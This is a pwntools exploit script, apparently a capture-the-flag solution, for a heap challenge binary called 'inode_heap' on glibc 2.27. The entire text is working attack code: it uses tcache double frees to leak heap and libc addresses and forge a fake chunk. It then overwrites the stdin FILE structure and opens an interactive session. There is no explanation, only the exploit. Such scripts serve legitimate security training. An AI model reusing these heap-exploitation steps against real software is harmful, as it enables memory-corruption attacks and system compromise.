#coding=utf-8
from pwn import *
import struct
local = 1
exec_file="./inode_heap"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    argv = ["/glibc/x64/2.27/lib/ld-2.27.so","--library-path","/glibc/x64/2.27/lib/","./inode_heap"]
    a=process(argv=argv)
    libc=ELF("/glibc/x64/2.27/lib/libc-2.27.so")
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("which command?\n> ",str(idx))
def add(type1,content):
    menu(1)
    a.sendlineafter("TYPE:\n1: int\n2: short int\n>",str(type1))
    a.sendafter("your inode number:",str(content))
def delete(idx):
    menu(2)
    a.sendlineafter("TYPE:\n1: int\n2: short int\n>",str(idx))

def show(idx):
    menu(3)
    a.sendlineafter("TYPE:\n1: int\n2: short int\n>",str(idx))

add(1,0x91)
add(1,0x21)
add(1,0x21)
add(1,0x21)
add(1,0x21)
add(1,0x21)

delete(1)
add(2,0x21)
delete(1)
add(2,0x21)
delete(1)
show(1)
a.recvuntil("your int type inode number :")
heap_base=eval(a.recvuntil("\n",drop=True))
heap_base=struct.pack("i",heap_base)
heap_base=struct.unpack("I",heap_base)[0]
fuck(heap_base)
fake_chunk_addr=heap_base-0xe0
add(1,fake_chunk_addr)
add(1,0x21)
add(1,0x21)#get fake chunk
for i in range(7):
    delete(1)
    add(2,0x21)
delete(1)
show(1)
main_arena_96 = libc.symbols["__malloc_hook"]+0x10+96
a.recvuntil("your int type inode number :")
libc_base=eval(a.recvuntil("\n",drop=True))
libc_base=struct.pack("i",libc_base)
libc_base=struct.unpack("I",libc_base)[0]-main_arena_96
fuck(libc_base)
stdin = libc_base+libc.symbols["_IO_2_1_stdin_"]
add(1,stdin+112)

add(1,0x21)
delete(1)
add(2,0x21)
delete(1)
add(2,0x21)
delete(1)
add(2,0x21)
delete(1)
add(1,fake_chunk_addr)

add(1,0x21)
add(1,0x21)
add(1,666)

menu(4)

a.interactive()









